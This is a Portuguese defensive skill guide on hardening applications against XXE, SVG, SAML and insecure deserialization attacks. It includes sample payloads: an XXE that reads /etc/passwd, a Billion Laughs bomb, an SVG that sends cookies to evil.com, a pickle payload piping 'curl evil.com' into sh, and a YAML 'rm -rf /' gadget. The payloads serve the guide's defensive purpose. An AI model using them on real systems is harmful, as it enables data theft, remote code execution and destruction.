---
name: xxe-and-deserialization-hardening
description: Defesa contra XXE (XML External Entity, Billion Laughs, XInclude, SVG malicioso, SOAP injection, SAML signature wrapping, DOCX/XLSX/plist) e desserializacao insegura generica (PHP unserialize, Python pickle/yaml.load, Java ObjectInputStream, .NET BinaryFormatter, Ruby Marshal, node-serialize, JSON com prototype pollution, Phar wrapper). Inclui defesa por linguagem (libxml/defusedxml/feature flags), sanitizacao de SVG, SAML signature validation, regras para JSON.parse com reviver. Complementa react-rsc-node-rce-hardening (RSC/Flight). Use em projetos que aceitem XML/SAML/SOAP/SVG/DOCX/XLSX, importacao de planilha, webhook XML, ou que facam unserialize/pickle/Marshal/readObject/yaml.load com input do usuario.
---

# xxe-and-deserialization-hardening

> **Frase-guia:** Formato inseguro não se endurece com fé; troca-se ou isola-se. Quando o formato é inerentemente perigoso com input não-confiável, mude de formato.

## 0. Regra suprema

Segurança tem prioridade absoluta. "Mas a feature exige aceitar XML/serialização rica" **não** justifica desabilitar proteção. Quando o formato é inerentemente inseguro com input não-confiável, **trocar de formato** (JSON + schema validation, em vez de XML aberto ou pickle).

Correção incremental. Não substituir skills. Não enfraquecer regras.

---

## 1. Objetivo

Cobrir vetores subestimados:

### Parte 1 — XXE / XML attacks

- **XXE classic** (leitura de arquivo local via `&xxe;`)
- **Blind XXE** (exfiltração via DNS/HTTP)
- **Billion Laughs / quadratic blowup** (DoS por expansão recursiva)
- **XInclude** (`<xi:include>` lendo arquivos)
- **SVG malicioso** (SVG é XML — XSS, XXE, foreignObject)
- **SOAP injection**
- **SAML signature wrapping** (assinar parte legítima, modificar outra)
- **Sitemap/RSS/Atom** de terceiro envenenado
- **DOCX/XLSX/ODT** (zip + XML internamente)
- **plist** (iOS export)
- **SVG em e-mail HTML, em PDF**

### Parte 2 — Insecure Deserialization

- **PHP `unserialize()`** com input do usuário → gadget chain → RCE
- **Python `pickle.loads()`** → RCE garantido
- **Python `yaml.load()`** (sem SafeLoader) → RCE
- **Java `ObjectInputStream` / `readObject()`** → gadget chain (commons-collections)
- **.NET `BinaryFormatter` / `LosFormatter`** (deprecated por segurança)
- **Ruby `Marshal.load`**
- **Node `node-serialize`** (RCE conhecido, deprecated)
- **JSON com prototype pollution** (`__proto__`, `constructor.prototype`)
- **Phar deserialization** em PHP (`file://`/`phar://` wrapper)
- **Cookie/session deserializado** server-side
- **Cache/Redis** com `pickle`/`serialize` valor

### Parte 3 — Formatos correlatos

- TOML/INI com input do usuário
- Protobuf sem schema validation
- BSON/MessagePack com tipos arbitrários
- `eval(JSON.parse(...))` antipattern

---

## 2. Por que esta skill existe

`/react-rsc-node-rce-hardening` cobre desserialização **específica do Flight protocol/RSC**. Esta skill cobre o **restante** (PHP/Python/Java/Node/Ruby/.NET) e XXE.

Vetores são reais e exploráveis com poucas linhas:
- XXE em parser XML mal configurado → leitura de `/etc/passwd`
- pickle em endpoint Python → RCE direto (atacante envia payload pickle gerado com `pickle.dumps(...)` + `__reduce__`)
- unserialize PHP em cookie → gadget chain em framework famoso → RCE

---

## 3. Contexto com exemplos

### 3.1 XXE clássico (PHP/libxml)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

Se parser tem entidades habilitadas, retorna `/etc/passwd` no campo correspondente.

### 3.2 Billion Laughs (DoS)

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... até lol9 -->
]>
<root>&lol9;</root>
```

Expande a bilhões de "lol", consome memória/CPU, derruba serviço.

### 3.3 SVG malicioso (upload aceito como imagem)

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <iframe src="javascript:alert(1)"/>
  </foreignObject>
  <script>fetch('//evil.com?c='+document.cookie)</script>
</svg>
```

SVG é XML + suporta `<script>`. Servido como `image/svg+xml` em mesma origem → XSS persistente, roubo de cookie.

### 3.4 PHP unserialize gadget chain

Atacante envia cookie/POST com payload serializado contendo objeto de classe interna do framework. Quando objeto é destruído (`__destruct`) ou despertado (`__wakeup`), executa código (via `Phar`/`SplFileObject`/Symfony classes/Laravel classes).

```php
// VULNERÁVEL — jamais
$data = unserialize($_COOKIE['session']);
```

### 3.5 Python pickle

```python
import pickle
# JAMAIS com input do usuário:
obj = pickle.loads(user_data)
# Pickle pode executar qualquer código via __reduce__
```

Payload exemplo do atacante:
```python
import pickle, os
class P:
    def __reduce__(self):
        return (os.system, ('curl evil.com | sh',))
payload = pickle.dumps(P())
# Enviar payload como input
```

### 3.6 YAML inseguro

```python
import yaml
# Inseguro:
yaml.load(user_input)
yaml.load(user_input, Loader=yaml.Loader)
# Permite: !!python/object/apply:os.system ["rm -rf /"]

# Seguro:
data = yaml.safe_load(user_input)
```

### 3.7 Prototype pollution (JS)

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];  // ❌ aceita __proto__
    }
  }
}
merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
// Agora Object.prototype.isAdmin === true para TODOS os objetos
```

### 3.8 Phar (PHP)

```php
// file_exists("phar://uploaded.zip/...") triggera desserialização
// de metadata do PHAR → RCE via gadget chain
// PHP 8+ mitiga parcialmente; ainda assim, evitar
```

---

## 4. Prioridade

1. Bloquear **RCE via desserialização** (mais grave)
2. Bloquear **leitura de arquivo via XXE**
3. Bloquear **DoS via Billion Laughs**
4. Bloquear **XSS via SVG** em upload
5. Bloquear **prototype pollution**
6. Bloquear **SAML signature wrapping**
7. UX: **trocar para formato seguro** quando viável (JSON + schema em vez de XML/pickle)

---

## 5. Quando usar

- API que aceita XML (SOAP, webhook XML, REST com `application/xml`)
- Importação de planilha/documento (XLSX, DOCX, ODT)
- Upload de SVG
- Importação de sitemap/RSS/Atom de terceiro
- SSO SAML
- Endpoint que aceita YAML/pickle/serialize
- Cookies/sessões com payload serializado server-side
- Cache Redis/Memcached armazenando objetos serializados
- Função de "merge profundo" / "extend" em JS/TS
- Aplicação Python/Ruby/Java/PHP que faz `unserialize`/`Marshal.load`/`readObject`/`pickle.loads`
- WebDAV / OPC (.docx/.xlsx) parsing
- Conversão de DOC para PDF
- E-mail processando anexo XML/SVG

---

## 6. Quando pode não se aplicar

- Aplicação só consome JSON com schema validation rigoroso
- Sem XML em nenhum ponto
- Sem `unserialize`/`pickle`/`yaml.load`/`Marshal.load`
- Sem upload de SVG

Mesmo assim, manter atenção (lib transitive pode introduzir XML parsing inseguro).

---

## 7. XXE — defesa por linguagem

### 7.1 PHP (libxml)

```php
// SimpleXML
$xml = simplexml_load_string($input, 'SimpleXMLElement', LIBXML_NONET);

// DOMDocument
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NONET);
// IMPORTANTE: não usar LIBXML_NOENT (expandiria entidades)

// PHP < 8: também chamar (em alguns contextos)
// libxml_disable_entity_loader(true);  // deprecated no PHP 8+

// XMLReader
$reader = new XMLReader();
$reader->open($file, null, LIBXML_NONET);
```

### 7.2 Python (defusedxml é obrigatório)

```python
# JAMAIS usar xml.etree.ElementTree ou lxml com input do usuário
# Usar defusedxml:
from defusedxml import ElementTree as ET
from defusedxml.lxml import fromstring as lxml_fromstring

tree = ET.fromstring(user_xml)
# ou
root = lxml_fromstring(user_xml)

# Para SAX:
from defusedxml.sax import make_parser
parser = make_parser()
```

### 7.3 Java

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Disable DTD completely
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Disable external entities (defense in depth)
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// XInclude off
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(input);
```

### 7.4 .NET

```csharp
var settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit, // ou Ignore
    XmlResolver = null,                      // bloqueia external resources
    MaxCharactersFromEntities = 10000,       // limite de expansão
    MaxCharactersInDocument = 10_000_000     // limite de tamanho
};
using var reader = XmlReader.Create(input, settings);
```

### 7.5 Node / xml2js / fast-xml-parser

```ts
// fast-xml-parser
import { XMLParser } from 'fast-xml-parser';

const parser = new XMLParser({
  allowBooleanAttributes: false,
  ignoreNameSpace: true,
  parseAttributeValue: false,
  trimValues: true,
  // NÃO habilitar entity processing
});
const obj = parser.parse(xmlString);

// xml2js (preferir versão recente)
import { parseStringPromise } from 'xml2js';
const obj = await parseStringPromise(xml, {
  explicitArray: false,
  // Não habilitar opção que processa DTD
});
```

### 7.6 SVG (upload) — sanitização

Server-side (PHP/Node):

```php
// PHP: usar svg-sanitizer (enshrined/svg-sanitize)
use enshrined\svgSanitize\Sanitizer;

$sanitizer = new Sanitizer();
$cleanSvg = $sanitizer->sanitize($svgContent);
```

```ts
// Node: DOMPurify
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);
const cleanSvg = DOMPurify.sanitize(svgContent, {
  USE_PROFILES: { svg: true, svgFilters: true },
  FORBID_TAGS: ['script', 'foreignObject'],
  FORBID_ATTR: ['onclick', 'onload', 'href'],
});
```

Regras adicionais para SVG:
- Servir com `Content-Disposition: attachment` quando possível
- Servir de **origem isolada** (subdomínio sandbox: `usercontent.dominio.com`)
- Bloquear `<script>`, `<foreignObject>`, `on*` attributes
- Bloquear `xlink:href`, `href` para `javascript:`
- CSP: `script-src 'none'` no subdomínio de upload
- Considerar **converter para PNG/WEBP** no servidor

### 7.7 Regra universal XML

Se não precisa de DTD/entity, **desabilitar**. Se precisa em casos controlados, validar via XSD com namespace estrito e tamanho limitado.

---

## 8. Desserialização — defesa por linguagem

### 8.1 PHP

```php
// ❌ NUNCA:
$obj = unserialize($_POST['data']);
$obj = unserialize($_COOKIE['session']);

// Se inevitável (legacy):
$obj = unserialize($input, ['allowed_classes' => ['MinhaClasseSegura', 'OutraSegura']]);

// MELHOR: usar JSON
$obj = json_decode($input, true, 512, JSON_THROW_ON_ERROR);
// + validação de schema
```

**Atenção Phar (PHP):**
```php
// file_exists("phar://uploaded.zip/...") triggera desserialização
// → RCE via gadget chain
// Mitigação:
// - PHP 8+ (mitigação parcial)
// - Sanitizer custom que rejeita wrappers phar:// file://
// - Validar magic bytes do upload antes de qualquer função de file
```

### 8.2 Python

```python
# ❌ NUNCA com input do usuário:
obj = pickle.loads(user_input)
obj = yaml.load(user_input)
obj = yaml.load(user_input, Loader=yaml.Loader)
obj = yaml.load(user_input, Loader=yaml.UnsafeLoader)
obj = shelve.open(user_path)

# ✅ SEMPRE:
import yaml
obj = yaml.safe_load(user_input)

import json
obj = json.loads(user_input)

# Para parsing tipado:
from pydantic import BaseModel
class MyData(BaseModel):
    field1: str
    field2: int
data = MyData.model_validate_json(user_input)
```

### 8.3 Java

```java
// ❌ NUNCA:
ObjectInputStream ois = new ObjectInputStream(...);
Object obj = ois.readObject();

// Alternativas seguras:
// - Jackson com whitelist de tipos
ObjectMapper mapper = new ObjectMapper();
mapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);
MyData data = mapper.readValue(input, MyData.class);

// - GSON com tipo concreto
Gson gson = new Gson();
MyData data = gson.fromJson(input, MyData.class);

// - Protobuf (schema-first)

// Se ObjectInputStream inevitável (legacy):
// usar ValidatingObjectInputStream (Apache Commons IO)
// com whitelist de classes permitidas
```

### 8.4 .NET

```csharp
// ❌ BinaryFormatter está OBSOLETO por motivo de segurança (RCE)
// JAMAIS usar com input do usuário
[Obsolete] BinaryFormatter formatter = ...; // não!
[Obsolete] LosFormatter
[Obsolete] NetDataContractSerializer
[Obsolete] SoapFormatter
[Obsolete] ObjectStateFormatter (ViewState!)

// Use:
System.Text.Json.JsonSerializer.Deserialize<MyData>(input);

// Newtonsoft.Json:
JsonConvert.DeserializeObject<MyData>(input, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.None  // ESSENCIAL
});
```

### 8.5 Ruby

```ruby
# ❌ NUNCA:
Marshal.load(user_input)
YAML.load(user_input)       # Ruby <= 2.6 inseguro
YAML.unsafe_load(user_input)

# ✅ USAR:
JSON.parse(user_input)
YAML.safe_load(user_input)   # Ruby 3+

# Rails:
JSON.parse(params[:data])
```

### 8.6 Node

```js
// ❌ node-serialize TEM RCE CONHECIDO — deprecated, remover do projeto
require('node-serialize').unserialize(userInput)

// ✅ Usar:
JSON.parse(userInput)
// + validação de schema:
import { z } from 'zod';
const Schema = z.object({ field: z.string() }).strict();
const data = Schema.parse(JSON.parse(userInput));
```

---

## 9. Prototype Pollution (JS) — defesa

### 9.1 Bloquear chaves perigosas em merge

```ts
// ❌ vulnerável
function merge(t: any, s: any) {
  for (const k in s) t[k] = s[k]; // aceita __proto__
}

// ✅ proteger
const DANGEROUS = new Set(['__proto__', 'constructor', 'prototype']);

function safeMerge(target: any, source: any): any {
  for (const k of Object.keys(source)) {
    if (DANGEROUS.has(k)) continue;
    if (!Object.hasOwn(source, k)) continue;
    if (typeof source[k] === 'object' && source[k] !== null && !Array.isArray(source[k])) {
      target[k] = safeMerge(target[k] || Object.create(null), source[k]);
    } else {
      target[k] = source[k];
    }
  }
  return target;
}
```

### 9.2 JSON.parse com reviver protetor

```ts
const data = JSON.parse(input, (key, value) => {
  if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
    return undefined;
  }
  return value;
});
```

### 9.3 Libs auditadas

- lodash **4.17.21+** (CVE de prototype pollution corrigida)
- evitar libs antigas de merge deep
- `Object.create(null)` em vez de `{}` quando manipula input do usuário
- Considerar `Map` em vez de objeto quando chaves são dinâmicas

---

## 10. SAML — defesa

SAML é XML assinado. Vetores:

- **Signature wrapping**: assinar parte legítima, atacante move/modifica outra parte
- **Comment injection**: comentário XML quebra parser e bypassa validação
- **Encrypt sem validação**

Regras:

1. **Validar assinatura ANTES** de processar conteúdo
2. Validar `Destination`, `Audience`, `Recipient`, `NotBefore`, `NotOnOrAfter`
3. **Não confiar em `<Issuer>`** sem validação contra IdP esperado
4. Usar lib **auditada** (não rolar próprio):
   - `passport-saml` (Node)
   - `python3-saml` (Python)
   - `ITfoxtec.Identity.Saml2` (.NET)
   - `lightsaml/lightsaml` (PHP)
5. **Atualizar lib** (CVEs frequentes em SAML)
6. Rejeitar `Encrypt` sem validação de cipher
7. Rejeitar assertions sem InResponseTo

---

## 11. Comandos de busca no código

```bash
# PHP — unserialize, XML, Phar
grep -rE "unserialize\s*\(" --include="*.php"
grep -rE "loadXML|loadHTML|simplexml_load|DOMDocument" --include="*.php"
grep -rE "phar://" --include="*.php"
grep -rE "file_exists\s*\(\s*['\"]phar" --include="*.php"

# Python — pickle, yaml, XML
grep -rE "pickle\.loads|cPickle\.loads" --include="*.py"
grep -rE "yaml\.load[^_]|yaml\.unsafe_load" --include="*.py"
grep -rE "xml\.etree|lxml\." --include="*.py"
grep -L "defusedxml" $(grep -rl "xml\.\|lxml" --include="*.py")

# Java — ObjectInputStream, XML, XMLDecoder
grep -rE "ObjectInputStream|readObject\(\)|XMLDecoder" --include="*.java"
grep -rE "DocumentBuilderFactory" --include="*.java"
# verificar se desabilita DTD
grep -L "disallow-doctype-decl\|setExpandEntityReferences.*false" $(grep -rl "DocumentBuilderFactory" --include="*.java")

# Node/JS — serialize, merge, JSON.parse
grep -rE "node-serialize|serialize-javascript" package.json
grep -rE "merge|extend|defaultsDeep" --include="*.{js,ts}"
grep -rE "JSON\.parse.*req\.|JSON\.parse.*request\." --include="*.{js,ts}"

# Ruby
grep -rE "Marshal\.load|YAML\.load[^_]" --include="*.rb"

# .NET
grep -rE "BinaryFormatter|LosFormatter|NetDataContractSerializer|SoapFormatter" --include="*.cs"
grep -rE "TypeNameHandling\s*=\s*[^N]" --include="*.cs"  # Newtonsoft com TypeNameHandling != None

# SVG em upload
grep -rE "image/svg|\.svg" --include="*.{php,js,ts,py}"
grep -rE "svg-sanitize|DOMPurify" --include="*.{php,js,ts,py}"
```

---

## 12. Dependências a auditar

| Lib | Risco | Versão segura / Alternativa |
|---|---|---|
| `node-serialize` (npm) | RCE conhecido | **REMOVER** — usar JSON + Zod |
| `serialize-javascript` antigo | CVEs corrigidas em recentes | Atualizar |
| `lodash` antigo | Prototype pollution | **4.17.21+** |
| `js-yaml` < 4 | RCE com `Loader` | Atualizar |
| `xml2js` antigo | XXE | Versão atual + opts |
| Python `PyYAML` < 5.1 | `yaml.load` inseguro | `safe_load` |
| Python `lxml` sem `defusedxml` | XXE | `defusedxml` obrigatório |
| Java `commons-collections` 3.x | Gadget chain | Atualizar |
| .NET `BinaryFormatter` | RCE — deprecated | `System.Text.Json` |
| PHP `phpunit/phpunit` < 5.6.3 | RCE em produção | Nunca em produção |
| Ruby `psych` < 3.1 | YAML unsafe default | Atualizar |
| `fast-xml-parser` antigo | XXE em algumas versões | Atual |

---

## 13. Limites preventivos

Aplicar em parsers:

- **Tamanho máximo** de payload XML/JSON/YAML (ex: 1MB)
- **Profundidade máxima** de objetos (ex: 32 níveis)
- **Tempo máximo** de parsing (timeout 5s)
- **Número máximo** de entidades XML (ex: 100)
- **Tamanho máximo** de expansão de entidade (ex: 100KB)

```ts
// JSON com limite de profundidade (Node)
function safeJsonParse(s: string, maxDepth = 32) {
  let depth = 0;
  for (const c of s) {
    if (c === '{' || c === '[') depth++;
    if (depth > maxDepth) throw new Error('Profundidade excedida');
    if (c === '}' || c === ']') depth--;
  }
  return JSON.parse(s);
}
```

---

## 14. Integração com skills existentes

- `/api-backend-hardening` — validação de schema em entrada (Zod, Valibot, Yup)
- `/file-upload-security` — SVG/DOCX/XLSX como upload
- `/external-api-integration-safety` — SOAP/SAML em integrações
- `/react-rsc-node-rce-hardening` — desserialização RSC/Flight (não duplicar)
- `/dependency-firewall` — libs vulneráveis
- `/database-hardening` — não armazenar serialized blob com input do usuário
- `/secure-code-review` — incluir busca por padrões inseguros no review
- `/incident-diagnosis` — se houve exploração
- `/webshell-and-ioc-detection` — webshell entregue via XXE/desserialização

---

## 15. Checklist

```text
# XML
[ ] Todo parser XML desabilita DTD/entity por padrão
[ ] PHP: LIBXML_NONET em todos os parses
[ ] Python: defusedxml em vez de xml.etree/lxml padrão
[ ] Java: disallow-doctype-decl + external-general-entities false
[ ] .NET: DtdProcessing.Prohibit + XmlResolver=null
[ ] Limite de tamanho de payload
[ ] Limite de profundidade
[ ] Limite de tempo de parsing

# SVG
[ ] Upload de SVG sanitizado (DOMPurify/svg-sanitize)
[ ] OU convertido para PNG/WEBP no servidor
[ ] OU servido em origem isolada (subdomínio sandbox)
[ ] Content-Disposition: attachment quando possível
[ ] CSP no subdomínio de upload

# Importação de planilha/documento
[ ] DOCX/XLSX validados (tamanho, estrutura)
[ ] Lib de parsing atualizada
[ ] Não executar macros
[ ] Limite de células/linhas

# SAML / SOAP
[ ] SAML lib mantida (passport-saml/python3-saml)
[ ] Signature validada ANTES do processamento
[ ] Destination/Audience/Recipient validados
[ ] NotBefore/NotOnOrAfter respeitados
[ ] InResponseTo validado

# Desserialização
[ ] Sem unserialize/pickle/Marshal/readObject com input do usuário
[ ] Cookies/sessões usam JSON (não serialize PHP) OU classes whitelisted
[ ] Cache não armazena pickled object sob chave influenciada pelo usuário
[ ] PyYAML usa safe_load
[ ] BinaryFormatter/LosFormatter removidos do código
[ ] node-serialize não presente no package.json
[ ] Phar wrapper protegido em PHP

# Prototype Pollution (JS)
[ ] Merge deep bloqueia __proto__/constructor/prototype
[ ] JSON.parse com reviver protetor em rotas críticas
[ ] lodash 4.17.21+
[ ] Libs antigas de merge auditadas
[ ] Object.create(null) em contexto com input do usuário

# Dependências
[ ] commons-collections, js-yaml, lodash atualizados
[ ] xml2js, fast-xml-parser atualizados
[ ] Sem libs deprecated por segurança (BinaryFormatter, node-serialize)
[ ] dependency-firewall ativo antes de instalar nova lib

# Limites
[ ] Tamanho máximo de payload XML/JSON
[ ] Profundidade máxima de objetos
[ ] Tempo de parsing limitado
[ ] Entidades XML limitadas

# Logs
[ ] Logs não vazam stack trace de parser
[ ] Mensagem genérica ao usuário em erro de parsing
```

---

## 16. Atualização do CLAUDE.md (sugestão)

```markdown
## XXE e desserialização insegura

Em qualquer projeto que aceite XML (SOAP, SAML, sitemap, RSS, DOCX, XLSX, SVG, plist) OU que faça unserialize/pickle/Marshal/readObject/yaml.load com input do usuário, invocar `/xxe-and-deserialization-hardening`.

Regras:
- Parser XML desabilita DTD/entity por padrão (LIBXML_NONET, defusedxml, disallow-doctype-decl)
- SVG upload sanitizado OU servido em origem isolada
- unserialize/pickle/Marshal com input do usuário é PROIBIDO — use JSON + schema
- yaml.safe_load em Python (yaml.load é inseguro)
- BinaryFormatter (.NET) removido do código
- node-serialize NÃO presente no package.json
- Merge deep bloqueia __proto__/constructor/prototype
- Lib de SAML mantida + validação completa (signature/audience/destination/InResponseTo)
- Limites preventivos: tamanho, profundidade, tempo de parsing

Quando o formato é inseguro com input não-confiável, TROCAR de formato.
```

---

## 17. O que NÃO fazer

- ❌ Confiar em parser XML "padrão" sem desabilitar DTD
- ❌ Aceitar SVG em upload sem sanitização
- ❌ `unserialize($_COOKIE['session'])`
- ❌ `pickle.loads(request.data)`
- ❌ `yaml.load(input)` (use safe_load)
- ❌ `Marshal.load(params[:data])`
- ❌ `BinaryFormatter` em qualquer contexto novo
- ❌ `node-serialize` (remover do projeto)
- ❌ Merge deep sem bloquear `__proto__`
- ❌ SAML sem validar signature ANTES de processar conteúdo
- ❌ Importar DOCX/XLSX sem limite de tamanho/células
- ❌ "Resolver depois" — desserialização insegura é RCE garantido

---

## 18. Critérios de aceite

- Todo parser XML do projeto desabilita DTD/external entity
- SVG upload sanitizado ou em origem isolada
- Nenhum `unserialize`/`pickle.loads`/`Marshal.load`/`readObject` com input do usuário
- `yaml.safe_load` em todo Python
- `BinaryFormatter`/`LosFormatter`/`node-serialize` removidos
- Merge deep com bloqueio de prototype pollution
- SAML com lib mantida e validação completa
- Limites preventivos aplicados (tamanho, profundidade, tempo)
- Dependências de parsing/serialization atualizadas

---

## 19. Frase-guia final

> **Formato inseguro não se endurece com fé; troca-se ou isola-se. unserialize com input do usuário é RCE garantido. SVG é XML, não imagem inocente. Parser XML padrão sem DTD off é XXE esperando acontecer.**

---

> 🧭 [[_HOME|🏠 HOME]] · [[skills-claude-code-MOC|⚙️ Skills Claude Code]] · [[Ecossistema-Skills-Agentes|🧩 Ecossistema]] · [[INDICE|🎯 Skills 00–18]] · [[agents-claude-code-MOC|🤖 Agentes]]
